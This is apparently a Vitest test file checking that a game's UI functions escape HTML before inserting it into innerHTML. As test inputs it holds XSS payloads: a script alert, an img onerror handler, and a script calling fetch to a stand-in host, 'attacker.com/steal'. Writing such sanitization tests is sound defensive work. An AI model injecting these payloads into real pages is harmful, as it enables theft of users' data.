import { describe, expect, it, beforeAll } from 'vitest';
import { escapeHtml, showGhostAdvicePopup, updateHud, type UiRefs } from '../src/presentation/ui';
import { createWorld } from '../src/core/store';

beforeAll(() => {
  if (typeof globalThis.window === 'undefined') {
    (globalThis as unknown as { window: unknown }).window = globalThis;
  }
});

function createMockElement() {
  return {
    innerHTML: '',
    textContent: '',
    title: '',
    style: { width: '', cssText: '' },
    dataset: { level: '' },
    classList: {
      add() {},
      remove() {},
      toggle() {},
    },
    querySelector() {
      return createMockElement();
    },
  };
}

describe('UI Security & XSS Sanitization', () => {
  it('escapeHtml safely escapes special HTML characters', () => {
    const raw = '<script>alert("XSS & Injection")</script>\'';
    const escaped = escapeHtml(raw);
    expect(escaped).not.toContain('<script>');
    expect(escaped).toBe('&lt;script&gt;alert(&quot;XSS &amp; Injection&quot;)&lt;/script&gt;&#39;');
  });

  it('showGhostAdvicePopup escapes HTML in speaker and text before injecting into innerHTML', () => {
    const mockBubbleEl = createMockElement();
    const mockUi = {
      ghostAdviceBubbleEl: mockBubbleEl,
    } as unknown as UiRefs;

    const maliciousSpeaker = 'Ghost<img src=x onerror=alert(1)>';
    const maliciousText = '<script>fetch("http://attacker.com/steal")</script>';

    showGhostAdvicePopup(mockUi, maliciousSpeaker, maliciousText, '💡');

    expect(mockBubbleEl.innerHTML).not.toContain('<script>');
    expect(mockBubbleEl.innerHTML).not.toContain('<img src=x onerror=alert(1)>');
    expect(mockBubbleEl.innerHTML).toContain('&lt;script&gt;fetch(&quot;http://attacker.com/steal&quot;)&lt;/script&gt;');
    expect(mockBubbleEl.innerHTML).toContain('Ghost&lt;img src=x onerror=alert(1)&gt;');
  });

  it('updateHud escapes ghost companion mood and name before injecting into innerHTML', () => {
    const mockWidgetEl = createMockElement();
    const mockUi = {
      ghostCompanionWidgetEl: mockWidgetEl,
      clockEl: createMockElement(),
      dateEl: createMockElement(),
      moneyEl: createMockElement(),
      newsTickerEl: createMockElement(),
      barEls: {
        fatigue: createMockElement(),
        faim: createMockElement(),
        stress: createMockElement(),
        moral: createMockElement(),
      },
      promptEl: createMockElement(),
      saveEl: createMockElement(),
      campaignChapterEl: createMockElement(),
      campaignObjectiveEl: createMockElement(),
      campaignPromptEl: createMockElement(),
      lastIso: '',
    } as unknown as UiRefs;

    const world = createWorld();
    world.ghostCompanion = {
      activeGhostId: 'smith',
      mood: '<b>Injected</b>',
      speechBubble: 'Normal bubble',
      lastAdviceTick: 0,
      unlockedThinkers: ['smith'],
    };

    updateHud(mockUi, world, '');

    expect(mockWidgetEl.innerHTML).not.toContain('<b>Injected</b>');
    expect(mockWidgetEl.innerHTML).toContain('&lt;b&gt;Injected&lt;/b&gt;');
  });
});
